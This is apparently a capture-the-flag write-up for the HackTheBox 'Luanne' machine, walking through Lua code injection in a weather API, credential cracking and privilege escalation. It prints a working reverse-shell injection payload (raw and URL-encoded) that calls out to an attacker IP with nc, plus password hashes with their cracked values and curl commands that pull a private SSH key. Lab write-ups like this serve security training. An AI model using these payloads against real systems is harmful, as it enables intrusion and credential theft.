## Nmap Scan:

**I Found 3 ports opened 22,80,9001.**

### Let's start with the Web Page:

> **It has authentication pop-up.**

> **I Tried admin:admin and other random credentials but no thing fine to login.**

> **But i noticed that when i got (401 Unauthorized) that is a localhost web page at port 3000.**

* We got robots.txt

![](https://i.ibb.co/mTQCjQq/image.png)

* /weather disallowd with comment: still harversting cities.

* access to luanne.htb/weather 404 not found.

* but there are cities we had to find them.

* let's fire up ffuf again to fuzz luanne.htb/weather/

> #### Use city=list to list available cities 

*okay, Thanks*


![]()

* It's just a weather statues for every city, I stucked here and got hint from HTB fourms. 

![]()

**Lua web application vulnerable to code injection by add a missing round brackets().**

* to get the shell we have to know the operating system and it's netBSD.
* by addind the missing round bracket to the shell.

```ruby
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f")â€”
``` 
**encode the url**
```ruby
http://luanne.htb/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.6%201234%20%3E%2Ftmp%2Ff%22%29--
```
## Getting reverse shell.

![]()

```html
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
* added to luanneWepApi.txt 

> **we have to crack this hash, so Used john to crack it**

![]()

**we got iamthebest**

## Enumerate luanne.


![]()

> * We got user r.michaels 

**Let's check the netstate** 

![]()

> * There is a localhost web page on port 3000 and 3001. 

**Let's Dig more**

![]()


![]()

**I got hinted to dig more in port 3001 and get id_rsa.**

**So let's Try to curl the local web server in port 3001.**
```html
curl 127.0.0.1:3001/~r.michaels/.ssh/id_rsa
``` 

![]()

> **no items here so we can find it in /~r.michaels/id_rsa ,Because we enterted launne as _httpd so this folder shared through web that's why we found id_rsa in /~r.michaels/ not in /~r.michaels/.ssh/**


![]()

> **No Authorization, So let's login with "iamthebest"** 

```html
curl - -user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
```

![]()


## SSH connecting.


![]()

![]()

> **WE will use netpgp to decrypt devel_backup-2020-09-16.tar.gz.enc**

![]()

> * we access to /webapi but no thing useful.


![]()

> **we access to /www and got another webapi_user.**
 
![]()

* webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.


#### As before we will use john to crack it.

> **we got"littlebear"**

**by switching to superuser permissions using sudo su...**

![]()

##### Command Not Found!!!

> **we had to find Alternatives for sudo su in netBSD operating system.**

* I found doas su, And that's ok.
* Surely we will use littlebear to get root.
